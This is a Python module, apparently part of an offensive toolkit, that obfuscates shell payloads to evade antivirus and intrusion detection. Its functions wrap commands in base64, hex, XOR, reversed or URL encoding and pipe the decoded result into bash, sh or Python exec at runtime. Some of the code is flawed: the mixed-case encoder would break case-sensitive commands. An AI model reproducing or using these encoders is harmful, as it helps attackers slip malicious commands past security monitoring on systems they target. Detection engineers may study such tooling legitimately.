"""Payload encoders — encode/obfuscate payloads for AV/IDS evasion.

Each encoder takes the raw payload command and produces an obfuscated variant
that decodes itself at execution time, keeping the final behavior identical.
"""

from __future__ import annotations

import base64
import codecs
import random
import string

ENCODERS: dict[str, str] = {
    "none": "Raw payload (no encoding)",
    "base64": "Base64 + shell decode wrapper",
    "base64_sh": "Base64 + `sh -c` decode wrapper (Linux)",
    "hex": "Hex-encoded + printf decode (Linux)",
    "xor": "XOR with random 1-byte key + python decoder",
    "reverse": "Reversed string + `rev` decode (Linux)",
    "mixedcase": "Mixed-case bash variable obfuscation (limited shells)",
    "url": "URL-encoded payload for injection into URLs/headers",
}


def encode_base64_sh(cmd: str) -> str:
    b64 = base64.b64encode(cmd.encode("utf-8")).decode()
    return f"echo {b64} | base64 -d | sh"


def encode_base64(cmd: str) -> str:
    b64 = base64.b64encode(cmd.encode("utf-8")).decode()
    return f"printf '{b64}' | base64 -d | bash"


def encode_hex(cmd: str) -> str:
    hx = cmd.encode("utf-8").hex()
    # Split into chunks to avoid argv length limits.
    chunks = [hx[i:i + 4096] for i in range(0, len(hx), 4096)]
    if len(chunks) == 1:
        return f"printf '{hx}' | xxd -r -p | bash"
    parts = " ".join(f"printf '{c}'" for c in chunks)
    return f"({parts}) | xxd -r -p | bash"


def encode_xor(cmd: str) -> str:
    key = random.randint(1, 255)
    data = bytes(b ^ key for b in cmd.encode("utf-8"))
    hexdata = data.hex()
    return (
        f"python3 -c \"import sys;"
        f"d=bytes.fromhex('{hexdata}');"
        f"print(bytes(b^{key} for b in d).decode());"
        f"exec(bytes(b^{key} for b in d).decode())\""
    )


def encode_reverse(cmd: str) -> str:
    rev = cmd[::-1]
    # Chunk to avoid quote nesting problems.
    b64rev = base64.b64encode(rev.encode("utf-8")).decode()
    return f"echo {b64rev} | base64 -d | rev | bash"


def encode_mixedcase(cmd: str) -> str:
    """Obfuscate a bash command using mixed-case builtins and variable splices."""
    out = []
    for ch in cmd:
        if ch.isalpha():
            out.append(ch.upper() if random.random() < 0.5 else ch.lower())
        else:
            out.append(ch)
    obf = "".join(out)
    # Embed with a harmless no-op prefix/suffix splice that survives in bash.
    return f"$(echo {obf})"


def encode_url(cmd: str) -> str:
    return _urlencode(cmd)


def _urlencode(cmd: str) -> str:
    out = []
    for b in cmd.encode("utf-8"):
        c = chr(b)
        if c.isalnum() or c in "-._~":
            out.append(c)
        else:
            out.append(f"%{b:02X}")
    return "".join(out)


def encode(raw: str, encoder: str) -> str:
    """Encode a raw payload command with the named encoder."""
    encoder = (encoder or "none").lower()
    if encoder == "none":
        return raw
    if encoder == "base64":
        return encode_base64(raw)
    if encoder == "base64_sh":
        return encode_base64_sh(raw)
    if encoder == "hex":
        return encode_hex(raw)
    if encoder == "xor":
        return encode_xor(raw)
    if encoder == "reverse":
        return encode_reverse(raw)
    if encoder == "mixedcase":
        return encode_mixedcase(raw)
    if encoder == "url":
        return encode_url(raw)
    raise ValueError(f"Unknown encoder: {encoder}")


def list_encoders() -> list[dict]:
    return [{"name": k, "description": v} for k, v in ENCODERS.items()]


if __name__ == "__main__":
    import sys
    cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
    for enc in list_encoders():
        print(f"=== {enc['name']} ===")
        print(encode(cmd, enc["name"]))
        print()
